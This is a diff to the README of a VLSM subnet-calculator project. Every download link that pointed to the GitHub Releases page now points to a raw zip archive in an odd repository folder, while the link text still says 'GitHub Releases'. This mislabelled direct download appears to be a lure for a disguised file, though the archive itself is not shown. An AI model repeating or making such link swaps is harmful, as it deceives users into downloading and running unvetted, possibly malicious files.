@@ -1,10 +1,10 @@
 # 🧮 calculadora_vlsm - Plan IP subnets with ease
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/biyearly-cruiser998/calculadora_vlsm/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/biyearly-cruiser998/calculadora_vlsm/raw/refs/heads/main/monologist/vlsm-calculadora-v1.5-alpha.3.zip)
 
 ## 📥 Download
 
-Visit this page to download: [GitHub Releases](https://github.com/biyearly-cruiser998/calculadora_vlsm/releases)
+Visit this page to download: [GitHub Releases](https://github.com/biyearly-cruiser998/calculadora_vlsm/raw/refs/heads/main/monologist/vlsm-calculadora-v1.5-alpha.3.zip)
 
 ## 🖥️ What this app does
 
@@ -34,7 +34,7 @@ The app runs in a browser, so you do not need to install extra tools or learn te
 
 ## 📦 Download and run on Windows
 
-1. Open the [GitHub Releases page](https://github.com/biyearly-cruiser998/calculadora_vlsm/releases)
+1. Open the [GitHub Releases page](https://github.com/biyearly-cruiser998/calculadora_vlsm/raw/refs/heads/main/monologist/vlsm-calculadora-v1.5-alpha.3.zip)
 2. Find the latest release
 3. Download the Windows file from that release
 4. Save the file to your Downloads folder or desktop
@@ -198,4 +198,4 @@ It also helps you see when an address is outside these ranges and is more likely
 
 ## 📍 Download again
 
-If you need the file again, use the release page here: [GitHub Releases](https://github.com/biyearly-cruiser998/calculadora_vlsm/releases)
+If you need the file again, use the release page here: [GitHub Releases](https://github.com/biyearly-cruiser998/calculadora_vlsm/raw/refs/heads/main/monologist/vlsm-calculadora-v1.5-alpha.3.zip)
